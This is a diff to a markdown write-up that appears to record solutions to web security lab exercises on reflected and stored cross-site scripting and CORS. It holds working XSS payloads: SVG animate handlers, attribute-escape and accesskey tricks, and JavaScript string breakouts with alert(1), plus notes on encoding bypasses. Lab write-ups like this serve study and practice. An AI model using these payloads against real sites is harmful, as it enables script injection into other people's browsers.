@@ -134,7 +134,7 @@ Then after modifying a payload from [here](https://brutelogic.com.br/blog/xss-wi
 
 Intended solution (which didn't work for me for some reason): `<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>`
 
-#### Reflected XSS with some SVG markup allowed
+#### Reflected XSS with some SVG markup allowed `TBD`
 
 First I checked all the tags allowed using [this](xss/rxss-svg-allowed.py) script.
 
@@ -151,7 +151,7 @@ Then I check all the events allowed using the same script.
 onbegin
 ```
 
-The only payload using the above event handler was: `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`
+The only payload using the above event handler was: `<svg><animate onbegin=alert(1) attributeName=x dur=1s>` but it has `animate` which is disallowed.
 
 I then try to draw a basic circle using `<svg>` which works:
 
@@ -181,13 +181,31 @@ title
 " autofocus onfocus="alert(1)
 ```
 
+#### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+`/?search=\'%0aalert(1);//`
+
 #### Stored XSS into anchor href attribute with double quotes HTML-encoded
 In website textbox put: `javascript:alert(1)`
 
-#### Reflected XSS in canonical link tag
+#### Reflected XSS in canonical link tag `TBD`
 
-```html
-<link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
+```<link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)```
+
+#### Reflected XSS into a JavaScript string with single quote and backslash escaped `TBD`
+
+```
+var searchTerms = 'asdf';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+encodeURIComponent() escapes all characters except: `A-Z a-z 0-9 - _ . ! ~ * ' ( )`
+
+'-alert(0)-' => var searchTerms = '\'-alert(0)-\''; => <img src="?searchTerms='-alert(1)-'">
+"-alert(1)-" => var searchTerms = '"-alert(1)-"'; => <img src="?searchTerms=%22-alert(1)-%22">
+%00" => var searchTerms = '�"'; => <img src="?searchTerms=%EF%BF%BD%22">
+
+https://www.autosectools.com/Cross-site-Scripting-Encoding-Bypass
+https://security.stackexchange.com/questions/155864/bypass-filtering-of-single-quote-for-xss-in-input-field
+https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\_Objects/encodeURIComponent
+
 ```
 
 #### Reflected XSS into a JavaScript string with angle brackets HTML encoded
@@ -520,8 +538,5 @@ function reqListener() {
 </script>
 ```
 
-#### CORS vulnerability with internal network pivot attack
-
-```TBD```
-
+#### CORS vulnerability with internal network pivot attack `TBD`
 
